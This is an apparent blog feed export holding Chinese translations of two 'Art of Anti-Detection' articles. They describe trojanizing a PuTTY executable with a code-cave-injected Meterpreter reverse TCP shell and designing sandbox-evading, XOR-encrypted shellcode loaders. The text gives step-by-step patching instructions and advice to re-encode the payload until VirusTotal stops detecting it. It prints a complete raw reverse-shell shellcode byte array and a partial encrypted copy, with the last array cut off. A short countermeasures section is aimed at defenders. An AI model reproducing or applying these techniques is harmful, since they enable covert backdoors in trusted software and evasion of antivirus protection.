<div align="center"><br><img src="/img/anti_av2_puttyLogin.png" align><br></div><br>这将是发生重定向的关键，因为没有足够的反病毒产品能够克隆这种复杂的操作手法，因此不会通过沙箱和动态分析机制检测到植入的后门。<br>使用基础的逆向工程方法，例如跟随字符串和字符串引用，将不难找到connect函数的地址。客户端与给定IP建立连接后，将在显示的窗口中显示一个字符串”login as：”。该字符串将帮助我们找到connect函数的地址，IDA Pro在查找字符串引用方面做得很好。<br>为了找到 “login as:”字符串，可以通过在IDA中点击Views-&gt;Open Subviews-&gt;Strings。<br><br><div align="center"><br><img src="/img/anti_av2_idastring.png" align><br></div><br>找到字符串并双击后，IDA会在数据部分内部找到为字符串创建的所有交叉引用，按Ctrl + X将显示所有交叉引用，在函数中引用字符串并显现“login as:”字符串。<br><div align="center"><br><img src="/img/anti_av2_Screenshot_2.png" align><br></div>

<div align="center"><br><img src="/img/anti_av2_Screenshot_3.png" align><br></div>

<p>这就是要patch的指令，在进行任何更改之前，请备份该指令。在后门代码执行后，将再次使用它。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_4.png" align><br></div><br>将PUSH 467C7C指令更改为JMP 0x47A478的后门程序的重定向已完成。请注意下一条指令地址，这一点很重要。执行后门代码后，它将用作返回地址。下一步将注入后门代码。<br><br>### 注入后门代码<br><br>在注入后门代码时，首先需要做的是在执行后门之前保存寄存器。所有寄存器中的每个值对于程序的执行都非常重要。通过在Code Caves的开头放置PUSHAD和PUSHFD指令，所有寄存器和寄存器标志都存储栈中。这些值将在执行后门代码后弹出，因此程序可以继续执行而不会出现任何问题。<br><br><div align="center"><br><img src="/img/anti_av2_savereg.png" align><br></div>

<p>如前所述，将使用的后门代码是metasploit项目中的meterpreter反向TCP Shell代码。但是shellcode几乎不需要更改。通常反向TCP Shellcode会尝试连接给定次数，如果连接失败，它将通过调用ExitProcess API调用来关闭进程。</p>
<div align="center"><br><img src="/img/anti_av2_dmet.png" align><br></div>

<p>问题是，如果到处理程序的连接失败，则putty客户端的执行将停止，现在修改每次连接失败时shellcode程序集的几行，shellcode就会重试连接到原始程序，并且shellcode的大小也会减小。</p>
<div align="center"><br><img src="/img/anti_av2_nmet.png" align><br></div>

<p>在汇编代码中进行必要的修改后，使用nasm -f bin stager_reverse_tcp_nx.asm命令对其进行编译。现在，可以使用反向TCP Shellcode，但不能直接使用它。目标是在新线程上执行shellcode。为了创建一个新的线程，需要有另一个shellcode进行CreateThread的API调用，该调用指向反向TCP shellcode。在Stephen Fever编写的metasploit项目中还有一个用于创建线程的shellcode，</p>
<div align="center"><br><img src="/img/anti_av2_CreateThread.png" align><br></div>

<p>将shellcode字节以十六进制格式放置在createthread.asm文件中后，即可使用nasm -f bin createthread.asm命令进行汇编。此时，可以将Shellcode插入到code cave中了，但是在插入Shellcode之前，应该对它进行编码，以绕过反病毒产品的静态/签名分析机制。由于大多数反病毒软件都能识别metasploit项目中的所有编码器，因此强烈建议使用自定义编码器。本文将不讨论这种自定义shellcode编码器的制作方法，因为这将是另一篇文章的主题，但是使用多个metasploit编码器也可能会起作用。在每个编码过程之后，建议以原始格式将编码的shellcode上传到virus total并检查检测分数。尝试每种组合，直到无法检测到为止，或者等待下一篇文章。<br>在对shellcode进行正确编码之后，是时候将其插入到code cave中了。选择PUSHFD下的指令，然后在调试器上按Ctrl + E，shellcode将以十六进制格式粘贴到此处。</p>
<div align="center"><br><img src="/img/anti_av2_Insert.png" align><br></div>

<p>使用xxd -ps createthread命令，以十六进制格式打印编码的createthread shellcode或使用十六进制编辑器打开shellcode并复制十六进制值。在将十六进制值粘贴到immunity 调试器时，请注意字节数限制，这些patch操作是使用immunity 调试器进行的，而immunity 调试器在粘贴以编辑代码窗口时具有字节数限制。它不会粘贴所有的shellcode，记住在“编辑代码”窗口中粘贴的shellcode的最后2个字节，在按下OK按钮之后，继续将字节粘贴到它们结束的位置，当所有的shellcode粘贴到代码中后，插入后门代码操作就做完了。</p>
<h3 id="恢复执行流程">恢复执行流程</h3><p>创建后门代码线程后，程序需要返回到原始程序执行流程执行，这意味着EIP应该跳回到将执行重定向到插入后门代码功能位置。但是在跳回该功能之前，应先恢复所有已保存的寄存器。</p>
<div align="center"><br><img src="/img/anti_av2_pop.png" align><br></div>

<p>通过在shellcode的末尾插入POPFD和POPAD指令，所有保存的寄存器都以相同的顺序从栈中弹出。弹出寄存器后，在跳回之前还需要再做一个思考。之前为了执行被劫持指令，将PUSH 467C7C指令替换为JMP 0x47A478，以便将程序的执行重定向到code cave。现在，需要将PUSH 467C7C指令放在最后，才能恢复被劫持的指令。最后通过插入JMP 0x41CB73指令将执行重定向到code cave的函数了，最后生成的代码应如下所示</p>
<div align="center"><br><img src="/img/anti_av2_end.png" align><br></div>

<p>最后，选择所有patch和插入的指令，按右键单击并复制到可执行文件。应该对已修改的每条指令执行此操作。将所有指令复制并保存到文件后，请关闭调试器并测试可执行文件，如果可执行文件运行顺利，则后门即可使用。<br>最后，建议修改最终文件的校验和，以保持文件的真实性而不显得可疑，这也可能会降低检测分数。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_6.png" align><br></div>

<h2 id="0x03_结论与预防措施">0x03 结论与预防措施</h2><p>最后，当正确应用上述步骤后，可生成完全无法检测后门。针对以上的两种代码注入方式，下面给出这些相应技术的对策，这些策略可以帮助系统管理员、恶意软件记录器、反病毒与反恶意软件产品的开发人员。</p>
<h3 id="1）section权限检查">1）section权限检查</h3><p>在谈到后门文件时，section权限flag对于检测异常非常重要，除非编译器愿意，否则当前的编译器绝不会为该节设置完整权限，尤其是像.data或.rdata这样的数据节不应如此具有执行权限，例如.text之类的代码段也不应具有写权限，这些异常应被视为可疑行为。</p>
<h3 id="2）异常section识别">2）异常section识别</h3><p>如果程序员不进行任何配置，编译器通常会创建5-6个通用类型的节，则所有安全产品都应具有识别不常见和可疑节的机制，如果节包含以下内容，则该机制可以查找节内的熵和数据对齐方式高熵和异常有序的数据，应该将其视为可疑的。</p>
<h3 id="3）签名检查">3）签名检查</h3><p>这种方法非常经典，但最有效，当下载新程序或任何可执行文件时，检查sha1签名是避免系统被植入后门文件的最安全方法。</p>
<h3 id="4）文件校验和检查">4）文件校验和检查</h3><p>如果可执行文件的校验和值与文件的实际校验和之间存在差异，则表明文件已被修改，安全产品和系统管理员应通过计算实际校验和并将其与文件的真实性进行比较来检查文件的真实性。</p>
<div align="center"><br><img src="/img/anti_av2_scan.png" align><br></div>

<h2 id="参考">参考</h2><p>[1] – <a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a><br>[2] – <a href="https://www.shellterproject.com/" target="_blank" rel="external">https://www.shellterproject.com/</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Red_team" target="_blank" rel="external">https://en.wikipedia.org/wiki/Red_team</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Code_cave" target="_blank" rel="external">https://en.wikipedia.org/wiki/Code_cave</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Checksum" target="_blank" rel="external">https://en.wikipedia.org/wiki/Checksum</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术1-反病毒软件及检测技术概述（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/"/>
    <id>http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/</id>
    <published>2020-09-03T11:39:22.000Z</published>
    <updated>2021-03-16T15:18:52.607Z</updated>
    <content type="html"><![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>反检测方法应该针对不同种类的恶意代码有不同的方法，本文介绍的所有反检测方法可以适用于所有种类的恶意代码但是本文侧重于stager meterpreter类型载荷，因为meterpreter能够做所有其他恶意代码能够做的事情，通过meterpreter会话可以做很多事情，包括权限提升、窃取凭据、操作进程/注册表，在利用漏洞后能够进行更多操作，meterpreter也拥有非常活跃的社区，在安全研究人员中很受欢迎。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="基于特征码的检测技术">基于特征码的检测技术</h3><p>传统反病毒软件严重依赖基于特征码的检测技术检测恶意代码。一般，当恶意代码达到反病毒公司后，将交由恶意代码研究人员或者动态分析系统进行分析，一旦被确定为恶意代码，就会提取该恶意代码的特征码并将特征码添加到反病毒软件数据库中。</p>
<h3 id="静态分析">静态分析</h3><p>静态分析是在没有实际执行程序的情况下对程序进行分析的技术。在大多数情况下，是对软件源代码的某些版本进行分析，在某些情况下也会对目标源码的某些形式进行分析。</p>
<h3 id="动态分析">动态分析</h3><p>动态分析是在真实或者虚拟的计算机上执行程序进行分析。为了提高动态分析的有效性，必须对目标程序产生足够的输入让目标程序产生一些有趣的行为。</p>
<h3 id="沙盒">沙盒</h3><p>在计算机安全中沙盒是一种隔离运行中程序的一种安全机制。通常用于执行未经测试或者不受信任的风险程序和代码，可能来自未经验证或者不受信任的第三方供应商、网站或者用户，通过沙盒执行可以避免损害主机或者操作系统。</p>
<h3 id="启发式分析">启发式分析</h3><p>很多反病毒软件采用启发式分析检测目前未知病毒和已知病毒变种。启发式分析是一种基于专家的分析系统，使用各种规则和权重确定各种威胁和风险的安全性。多标准分析（MCA）是其中一种衡量手段，启发式分析不同于静态分析，静态分析依赖于自身的数据和统计信息。</p>
<h3 id="熵">熵</h3><p> 在计算机科学中，熵是操作系统或者应用程序收集的用于密码学或者其他需要随机数据用途的随机性的一种衡量方式。这种随机性一般来源于硬件，如鼠标移动或者专用的硬件随机数生成器的。熵过低可能会对计算机性能或者安全性造成伤害。</p>
<h2 id="0x02_常用反检测方法">0x02 常用反检测方法</h2><p>为了降低恶意代码被检测的风险，首先考虑使用的方式是加密程序、打包程序或者代码混淆。这些反检测技术和工具仍然可以绕过很多反病毒软件，但随着网络安全领域的进步，大多数的工具和方法已经过时并且无法生成完全不被检测的恶意代码。但是为了理解这些技术和工具的内部工作原理，这里还将对其进行简要描述。</p>
<h3 id="代码混淆">代码混淆</h3><p>代码混淆可以定义为在不破坏实际功能的情况下对二进制程序的源代码进行混淆的一种方法，这使静态分析更加困难，同时还改变二进制代码的哈希签名。混淆只需添加几行垃圾代码或更改指令的执行顺序即可实现。这种方法可以绕过数量可观的反病毒软件，但要取决于您混淆了多少。</p>
<h3 id="压缩壳工具">压缩壳工具</h3><p>压缩壳工具是压缩可执行文件并将压缩后的数据与解压缩代码合并为单个可执行文件的一种程序。当执行被压缩壳压缩的程序时，解压缩代码将在执行之前从压缩的代码重新创建原始代码。在大多数情况下，这对原始程序是透明的，因此可以与原始文件完全相同的方式使用压缩的可执行文件。当反病毒软件扫描被打包压缩的恶意代码时，它需要确定压缩算法并将其解压缩。由于压缩后的文件较难分析，因此恶意软件作者对压缩壳工具表现出了浓厚的兴趣。</p>
<h3 id="加密壳工具">加密壳工具</h3><p>加密壳工具是对给定二进制文件进行加密的程序，以使其难以分析或者进行逆向工程。被加密壳打包的程序优两部分组成：builder和stub，builder仅对给定的二进制文件进行加密并将其放置在stub中，stub是加密壳中最重要的部分，当我们执行被加密壳打包的二进制文件时，第一个stub运行并解密原始二进制文件到内存，然后通过RunPE方法在内存中执行二进制文件（在大多数情况下）。</p>
<div align="center"><br><img src="/img/anti_av_crypters.png" align><br></div>

<h2 id="0x03_加密壳压缩壳所面临的问题">0x03 加密壳压缩壳所面临的问题</h2><p>在介绍最有效反检测技术之前，已知的反检测技术其实所面临的问题其实很少。但是现在的反病毒公司已经意识到了这种危险，现在他们不仅扫描恶意代码的特征和有害行为，还在扫描加密壳和压缩壳的特征。与检测恶意代码相比，检测加密壳和压缩壳相对容易，因为它们都必须做某些可疑的事情，例如解密加密的PE文件并在内存中执行。</p>
<h3 id="PE注入">PE注入</h3><p>为了说明PE映像如何在内存中的执行，本文将会讲解Windows如何加载PE文件。在编译PE文件时，编译器会将主模块基地址设置为0x00400000，而编译过程中所有的地址指针和长跳转指令处的地址都是根据主模块地址计算的，在编译后期，编译器会在PE文件中创建一个重定位表，重定位表中包含的指令的地址取决于映像基址，例如地址指针和长跳转指令。<br>在执行PE映像时，操作系统会检查PE映像的默认基地址的可用性，如果默认基地址不可用，则操作系统会在启动过程系统加载程序需要之前，将PE映像加载到内存中的随机可用地址上。然后通过重定位表调整内存中的绝对地址，系统加载程序会修复所有与绝对地址相关的指令，然后启动这个被挂起的进程。这种机制称为地址随机化ASLR。<br>为了在内存上执行PE映像，加密壳需要解析PE头并重新定位绝对地址，同时必须模拟系统加载器，这种行为是非常可疑的。几乎每次当我们分析用C或其他高级语言编写的加密壳的时候，我们都会发现使用了NtUnmapViewOfSection或者ZwUnmapViewOfSection这两个Windows系统API，这两个函数的作用为从虚拟内存中卸载某些sections的映射，它们在RunPE类内存执行技术中起着非常大的作用，几乎%90的加密壳都会使用这种技术。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xNtUnmapViewOfSection = NtUnmapViewOfSection<span class="list">(<span class="keyword">GetProcAddress</span><span class="list">(<span class="keyword">GetModuleHandleA</span><span class="list">(<span class="string">"ntdll.dll"</span>)</span>, <span class="string">"NtUnmapViewOfSection"</span>)</span>)</span><span class="comment">;</span></span><br><span class="line">xNtUnmapViewOfSection<span class="list">(<span class="keyword">PI</span>.hProcess, PVOID<span class="list">(<span class="keyword">dwImageBase</span>)</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>当然，反病毒软件不能仅仅对使用这些Windows API函数的程序都判定为恶意代码，但使用这些函数的顺序非常重要。一小部分的加密壳（通常是用汇编语言编写）不使用这些函数并手动执行重定位，之前这种方式非常有效，但后续这种方法也将可能会失效，因为从逻辑上讲，正常程序都不会模拟系统加载器。另一个缺点是输入文件的熵极大增加，因为对整个PE文件进行了加密，熵将不可避免地上升，当反病毒软件检测到PE文件异常熵时，它们可能会将文件标记为可疑文件。</p>
<div align="center"><br><img src="/img/anti_av_suspicious.png" align><br></div>

<h3 id="完美的方法">完美的方法</h3><p>通过加密恶意代码实现反检测的概念很聪明，但是执行解密功能的函数应该适当地的做混淆处理，同时内存中执行解密代码的时候，我们必须在不执行重定位的情况下进行加密，而且还必须有一种检测执行环境的功能的检测机制恶意代码是否在沙盒中执行，如果检测机制检测到反病毒软件正在分析恶意软件，则不应执行解密功能。与其加密整个PE文件不如只加密shellcode或仅二进制文件的.text节，这样可以使熵值较低，也不用修改PE头部和其他节。<br>下面是恶意代码的执行流程图。</p>
<div align="center"><br><img src="/img/anti_av_malware_flow.png" align><br></div><br>在环境检测函数中将会检查当前恶意代码是否在沙盒中被动态分析，如果检测到正在沙盒中被动态分析则继续执行main函数或者直接崩溃，如果未检测到沙盒环境则执行解密shellcode函数。<br>原始reverse tcp meterpreter的shellcode如下：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd1</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x8d</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xb8</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xc4</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x97</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0c</span>,</span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0x4e</span>, <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0xd5</span>, <span class="number">0x8b</span>, <span class="number">0x36</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0x53</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>,</span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x75</span>, <span class="number">0xee</span>, <span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">为了使熵值和文件大小保持在适当的值，我们将会使用简单的XOR加密算法加密这段shellcode，虽然XOR不是一个像RC4、blowfis的标准的加密算法，但是我们不需要一个强加密算法，因为反病毒软件不会去解密shellcode，仅仅是让这段shellcode对静态字符串分析不可读和不可检测就够了，同时使用XOR会使得解密更快并且避免使用加密库会使文件大小更小。</span><br><span class="line">经过XOR加密后的代码如下：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfb</span>, <span class="number">0xcd</span>, <span class="number">0x8d</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x93</span>, <span class="number">0xe2</span>, <span class="number">0x14</span>, <span class="number">0xcf</span>, <span class="number">0xfa</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x12</span>, <span class="number">0xb1</span>, <span class="number">0x91</span>, <span class="number">0x55</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, <span class="number">0xcc</span>, <span class="number">0xae</span>, <span class="number">0xc9</span>, <span class="number">0xf3</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x92</span>, <span class="number">0x45</span>, <span class="number">0xb8</span>, <span class="number">0x8b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x66</span>, <span class="number">0x59</span>, <span class="number">0x0d</span>, <span class="number">0xb2</span>,</span><br><span class="line">  <span class="number">0x9a</span>, <span class="number">0x83</span>, <span class="number">0x4e</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x6c</span>, <span class="number">0xe8</span>, <span class="number">0x15</span>, <span class="number">0x0a</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0xae</span>, <span class="number">0x45</span>, <span class="number">0xa2</span>, <span class="number">0x31</span>, <span class="number">0x0e</span>, <span class="number">0x90</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0x6d</span>, <span class="number">0x0e</span>, <span class="number">0x4f</span>,</span><br><span class="line">  <span class="number">0xeb</span>, <span class="number">0xc9</span>, <span class="number">0xd8</span>, <span class="number">0x3a</span>, <span class="number">0x06</span>, <span class="number">0xf6</span>, <span class="number">0x84</span>, <span class="number">0xd7</span>, <span class="number">0xa2</span>, <span class="number">0xa1</span>, <span class="number">0xbb</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x8c</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x9f</span>, <span class="number">0x6c</span>, <span class="number">0x73</span>, <span class="number">0x7e</span>, <span class="number">0xb6</span>, <span class="number">0xc6</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0x9f</span>,</span><br><span class="line">  <span class="number">0x7d</span>, <span class="number">0x7a</span>, <span class="number">0x61</span>, <span class="number">0x6f</span>, <span class="number">0xf1</span>, <span class="number">0x26</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x3f</span>, <span class="number">0xa5</span>, <span class="number">0x6f</span>,</span><br><span class="line">  <span class="number">0xe3</span>, <span class="number">0x7d</span>, <span class="number">0x84</span>, <span class="number">0xc6</span>, <span class="number">0x9e</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x7c</span>, <span class="number">0x8c</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0xe2</span>, <span class="number">0x5e</span>, <span class="number">0x80</span>, <span class="number">0xc9</span>, <span class="number">0x8c</span>, <span class="number">0x21</span>, <span class="number">0x84</span>, <span 